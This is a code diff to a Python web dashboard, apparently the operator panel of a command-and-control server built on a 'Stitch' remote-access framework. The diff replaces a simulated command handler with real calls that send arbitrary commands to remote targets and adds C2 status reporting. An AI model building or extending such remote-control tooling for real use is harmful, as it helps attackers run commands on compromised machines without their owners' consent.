@@ -22,6 +22,7 @@ from auth_utils import api_key_or_login_required
 from validation_schemas import validate_input
 from error_handler import error_handler, ErrorSeverity, ErrorCategory, ErrorContext
 from web_app_enhancements import log_command_execution, get_connection_manager, get_metrics_collector
+from c2_integration import get_stitch_server, get_elite_executor, get_system_status
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -101,6 +102,9 @@ def get_active_connections():
 def get_server_status():
     """Get server status and health information"""
     try:
+        # Get C2 system status
+        c2_status = get_system_status()
+        
         # Get system metrics
         performance = metrics_collector.get_performance_summary()
         system_metrics = metrics_collector.get_system_metrics(10)
@@ -116,6 +120,7 @@ def get_server_status():
             'success': True,
             'timestamp': datetime.now().isoformat(),
             'server_status': 'running',
+            'c2_system': c2_status,
             'active_connections': active_connections,
             'performance': performance,
             'system_metrics': system_metrics[-1] if system_metrics else None,
@@ -288,18 +293,46 @@ def execute_command():
         start_time = time.time()
         logger.info(f"Executing command '{command}' on target '{target_id}' by user {user_id}")
         
-        # Simulate command execution
-        # In a real implementation, this would interface with the C2 server
-        execution_result = {
-            'command_id': f"cmd_{int(time.time() * 1000)}",
-            'command': command,
-            'target_id': target_id,
-            'status': 'executing' if async_execution else 'completed',
-            'output': f"Command '{command}' executed successfully on {target_id}",
-            'error': None,
-            'execution_time': 0.5,
-            'timestamp': datetime.now().isoformat()
-        }
+        # Execute command using C2 server
+        try:
+            server = get_stitch_server()
+            if hasattr(server, 'send_command'):
+                # Use real C2 server
+                result = server.send_command(target_id, command)
+                execution_result = {
+                    'command_id': f"cmd_{int(time.time() * 1000)}",
+                    'command': command,
+                    'target_id': target_id,
+                    'status': 'completed' if result.get('success') else 'failed',
+                    'output': result.get('output', ''),
+                    'error': result.get('error'),
+                    'execution_time': 0.5,
+                    'timestamp': datetime.now().isoformat()
+                }
+            else:
+                # Fallback to mock execution
+                execution_result = {
+                    'command_id': f"cmd_{int(time.time() * 1000)}",
+                    'command': command,
+                    'target_id': target_id,
+                    'status': 'completed',
+                    'output': f"Command '{command}' executed successfully on {target_id}",
+                    'error': None,
+                    'execution_time': 0.5,
+                    'timestamp': datetime.now().isoformat()
+                }
+        except Exception as e:
+            # Error executing command
+            execution_result = {
+                'command_id': f"cmd_{int(time.time() * 1000)}",
+                'command': command,
+                'target_id': target_id,
+                'status': 'failed',
+                'output': '',
+                'error': str(e),
+                'execution_time': time.time() - start_time,
+                'timestamp': datetime.now().isoformat()
+            }
         
         # Calculate execution time
         execution_time = time.time() - start_time
